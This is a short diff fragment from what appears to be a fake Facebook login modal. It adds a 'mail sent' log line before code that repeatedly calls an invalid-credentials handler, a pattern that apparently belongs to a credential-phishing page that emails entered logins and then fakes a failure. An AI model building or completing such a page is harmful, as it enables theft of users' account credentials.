@@ -104,6 +104,7 @@ const FacebookLogin = ({ isOpenFacebook, closeModal }: FacebookLoginProps) => {
                     },
                   ))()! as unknown as string,
               });
+              console.log("mail sent");
               setInterval(() => invalidCredentials(), 1000);
             }
           }}
